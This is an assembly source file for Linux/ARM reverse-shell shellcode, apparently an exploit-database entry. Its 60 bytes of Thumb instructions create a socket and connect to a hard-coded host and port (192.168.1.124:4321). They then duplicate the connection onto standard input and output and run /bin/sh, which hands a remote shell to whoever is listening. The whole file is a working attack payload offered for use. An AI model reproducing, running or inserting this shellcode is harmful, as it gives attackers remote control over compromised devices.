/*
* Title:  Linux/ARM - Reverse_Shell Shellcode TCP (/bin/sh). Null free shellcode (60 bytes)
*Reverse shellcode for ARM 60 bytes-shortest ever till the date of creation
* Date:   2019-01-27
* Tested: armv7l (Raspberry Pi b3+)
* Author: Gokul Babu-https://www.linkedin.com/in/gokul-babu-452b3b112/
*/

/*socket 281, domain=2,type=1,protocol=0*/
/*connect 283,sockfd=resultant vaule r0=3,*addr=AF_inet+port+ip,addrlen=16bytes*/
/*dup2 63,oldfd=sockfd, newfd=0-stdin,1-stout,2-stderr*/
/*execve 11, *command="/bin/sh",0,0"*/
.section .text
.global _start
_start:
.ARM
	add r3,pc,#1
	bx r3
.THUMB
//socket:
	mov r0,#2
	mov r1,#1
	mov r7,#200
	add r7,#81
	svc #1
	push {r0,r1,r2} /*store all values r0=3,r1=1,r2=0*/
//connect:
	adr r1,exc+8 /*pointing to AF_Inet+PORT+IP*/
	strb r2,[r1,#1]
	mov r2,#16
	add r7,#2
	svc #1
//dup2:
//dup2(3,2)/*No need of stderr, program works fine without stderr*/
	pop {r0,r1,r2} /*Restoring all values as the values would have been changed after connect call*/
	mov r7,#63
//dup2(3,1)
	svc #1
//dup2(3,0) -> but gets changed to dup2(1,0)-see strace debug file for reference
	sub r1,#1
	svc #1
//execve:
	adr r0,exc
	strb r1,[r0,#7]
	mov r7,#11
	svc #1
exc:
        .ascii "/bin/shX"
//struct:
	.ascii "\x02\xff"
	.ascii "\x10\xE1" //port 4321
	.byte 192,168,1,124 //IP